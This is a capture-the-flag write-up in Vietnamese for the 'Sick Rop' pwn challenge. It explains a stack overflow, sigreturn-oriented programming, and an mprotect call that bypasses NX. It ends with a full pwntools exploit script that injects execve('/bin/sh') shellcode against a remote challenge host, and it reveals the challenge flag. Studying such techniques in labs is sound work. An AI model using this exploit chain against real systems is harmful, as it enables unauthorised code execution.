# Sick Rop 

- You might need some syscalls. 

## ida 

- chương trình rất đơn giản , chỉ có read và write thôi 

```c 
void __fastcall __noreturn start(int a1, int a2, int a3, int a4, int a5, int a6)
{
  while ( 1 )
    vuln(a1, a2, a3, a4, a5, a6);
} 

__int64 __fastcall vuln(int a1, int a2, int a3, int a4, int a5, int a6)
{
  size_t v6; // rax
  int v7; // edx
  int v8; // ecx
  int v9; // r8d
  int v10; // r9d
  const char *v11; // r10
  char v13[32]; // [rsp+0h] [rbp-20h] BYREF

  v6 = read(a1, a2, a3, a4, a5, a6, v13, 0x300uLL);
  return write(a1, a2, v7, v8, v9, v10, v11, v6);
}
``` 

## Analysis 

- ngay cái name vs description ta cũng đoán chall sử dụng kĩ thuật SROP rồi
- check các gadget thì thấy chỉ có mỗi syscall không có pop nào hết  

![image](https://github.com/gookoosss/CTF/assets/128712571/23eb78a1-7c44-41d8-88f5-410205e39a64)


- để thực thi Sigreturn thì ta cần set rax = 0xf, ko có pop rax thì là 1 vấn đề khó khăn đây
- sau khi tham khảo wu thì mình nhận ra ta có thể lợi dụng syscall read trong chall để set rax , rax = số byte nhập vào
- còn 1 vấn đề nữa là sau khi Sigreturn xong thì ta thực thi syscall nào đây?? trong chall không có sẵn /bin/sh cũng như không có hàm in để ta leak addr 

![image](https://github.com/gookoosss/CTF/assets/128712571/c69c773f-355f-47d5-98bc-0bd5371c0e6c)


- mình lại tiếp tục phải tham khảo wu lần nữa :))
- có 1 syscall khá thú vị có thể thay đổi quyền truy cập của một vùng nhớ trong quá trình thực thi chương trình đó là mprotect 

## mprotect 

![image](https://github.com/gookoosss/CTF/assets/128712571/b027c3b6-539e-4c6c-8fb8-fb411f7f3112)


- để dễ hình dung thì xem ví dụ dưới 

```asm 
section .data
    message db "Hello, World!", 0 ; (r__)

section .text
    global _start

_start:
    ; set up arg
    mov rdi, message ; addr(r__)
    mov rsi, 14      ; size (byte)
    mov rdx, 7       ; Quyền truy cập mới (7 = rwx)

    ; syscall mprotect
    mov rax, 10      ; Hệ thống ngắn gọn cho mprotect
    syscall
    
    ; lúc này message từ r__ => rwx (có quyền thực thi shellcode)
    ; Tiếp tục thực hiện shellcode sau khi đã thay đổi quyền truy cập

    ; ...

    ; Kết thúc chương trình
    mov eax, 60      ; Hệ thống ngắn gọn cho exit
    xor edi, edi     ; Mã thoát là 0
    syscall
``` 
- tóm lại là syscall mprotect có thể thay đổi quyền thực thi của 1 địa chỉ thành rwx (kể cả khi NX bật) cho phép ta bypass NX thực thi shellcode 
- sử dụng Sigreturn để thực thi mprotect , từ lần nhập sau ta có thể nhập shellcode 

## Exploit 
- trước tiên ta cần tìm 1 địa chỉ trỏ đến vuln để sau khi thực thi mprotect nó sẽ chạy lại hàm vuln cho phép ta nhập shell code  

![image](https://github.com/gookoosss/CTF/assets/128712571/aa9ed263-43c5-4b9f-a865-9270e7493500)

- 0x4010d8 là thứ ta cần, ta chọn 0x400000 làm vùng nhớ rwx
- bây giờ ta set Signreturn cho mprotect 

```python 
frame = SigreturnFrame()
frame.rax = 10 # mprotect
frame.rdi = 0x400000 # addr
frame.rdx = 7 # rwx 
frame.rsi = 0x2000 # size
frame.rsp = 0x4010d8 # trỏ đến vuln
frame.rip = syscall

payload = b'a'*40
payload += p64(exe.sym.vuln) # rip lần 1
payload += p64(syscall) # rip lần 2
payload += bytes(frame)

p.send(payload)
p.recv()

p.send(b'a'*0xf) # rax = 0xf
p.recv()
``` 

![image](https://github.com/gookoosss/CTF/assets/128712571/09d4eb07-98ee-4a6a-9065-540f289e1609)


- ok ta đã có được thứ ta cần , giờ chỉ cần nhập shellcode và lấy flag thôi 

![image](https://github.com/gookoosss/CTF/assets/128712571/f72c243e-c4c9-4f9f-baa8-32395e3d4ae0)





## script 

```python 
from pwn import *

p = process('./sick_rop')
p = remote('159.65.20.166',32384)
context.binary = exe = ELF('./sick_rop',checksec=False)
syscall = 0x401014 

# gdb.attach(p,gdbscript='''
# 	b*vuln+18
# 	b*vuln+23
# 	b*vuln+32
# 	c
# 	''')

# input()




frame = SigreturnFrame()
frame.rax = 10 # mprotect
frame.rdi = 0x400000 # addr
frame.rdx = 7 # rwx 
frame.rsi = 0x2000 # size
frame.rsp = 0x4010d8 # trỏ đến vuln
frame.rip = syscall

payload = b'a'*40
payload += p64(exe.sym.vuln) # rip lần 1
payload += p64(syscall) # rip lần 2
payload += bytes(frame)

p.send(payload)
p.recv()

p.send(b'a'*0xf) # rax = 0xf
p.recv()

shellcode = asm('''
	mov rbx, 29400045130965551
	push rbx

	mov rdi, rsp
	xor rdx, rdx
	xor rsi, rsi
	mov rax, 0x3b
	syscall
	''',arch='amd64')

payload = shellcode
payload = payload.ljust(40,b'P') + p64(0x4010b8)
p.send(payload)

p.interactive()
```

## Flag 

HTB{why_st0p_wh3n_y0u_cAn_s1GRoP!?}
